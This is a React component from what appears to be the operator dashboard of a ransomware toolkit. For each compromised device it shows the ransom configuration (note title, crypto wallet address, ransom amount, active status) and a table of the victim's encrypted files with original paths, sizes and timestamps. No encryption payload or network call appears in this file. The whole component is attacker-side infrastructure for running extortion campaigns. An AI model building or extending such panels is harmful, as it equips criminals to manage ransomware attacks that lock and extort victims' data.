import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import DataTable from '../components/DataTable'
import { ransomware } from '../utils/api'
import { Lock, AlertTriangle, FileKey, Unlock } from 'lucide-react'

export default function RansomwarePage() {
  const { deviceId } = useParams()
  const [config, setConfig] = useState(null)
  const [encrypted, setEncrypted] = useState([])

  useEffect(() => { if (deviceId) loadData() }, [deviceId])

  const loadData = async () => {
    const [c, e] = await Promise.all([ransomware.get(deviceId), ransomware.encrypted(deviceId)])
    if (c) setConfig(c)
    if (e) setEncrypted(e)
  }

  const columns = [
    { key: 'original_path', label: 'Original Path', render: (row) => (
      <span className="text-xs font-mono truncate max-w-[300px] block">{row.original_path}</span>
    )},
    { key: 'file_size', label: 'Size', render: (row) => (
      <span className="font-mono text-xs">{(row.file_size / 1024).toFixed(1)} KB</span>
    )},
    { key: 'encrypted_at', label: 'Encrypted', render: (row) => (
      <span className="text-xs font-mono">{new Date(row.encrypted_at).toLocaleString()}</span>
    )}
  ]

  return (
    <div className="animate-fade-in">
      <PageHeader title="Ransomware" icon={Lock} onDeviceChange={() => {}} />

      {config && (
        <div className="wuzen-panel p-6 mb-6 border-wuzen-danger/30">
          <div className="flex items-center gap-2 mb-4">
            <AlertTriangle className="w-5 h-5 text-wuzen-danger" />
            <h3 className="text-sm font-semibold text-wuzen-danger uppercase tracking-wider">Active Ransomware Configuration</h3>
          </div>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            <div className="p-3 rounded bg-wuzen-card">
              <p className="text-[10px] text-wuzen-muted uppercase">Title</p>
              <p className="text-sm">{config.title}</p>
            </div>
            <div className="p-3 rounded bg-wuzen-card">
              <p className="text-[10px] text-wuzen-muted uppercase">Wallet</p>
              <p className="text-xs font-mono truncate">{config.wallet_address}</p>
            </div>
            <div className="p-3 rounded bg-wuzen-card">
              <p className="text-[10px] text-wuzen-muted uppercase">Amount</p>
              <p className="text-sm text-wuzen-secondary">{config.amount} {config.currency}</p>
            </div>
            <div className="p-3 rounded bg-wuzen-card">
              <p className="text-[10px] text-wuzen-muted uppercase">Status</p>
              <p className={`text-sm ${config.is_active ? 'text-wuzen-danger' : 'text-wuzen-muted'}`}>{config.is_active ? 'ACTIVE' : 'INACTIVE'}</p>
            </div>
          </div>
        </div>
      )}

      <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-3">Encrypted Files</h3>
      <DataTable columns={columns} data={encrypted} keyField="id" searchable />
    </div>
  )
}
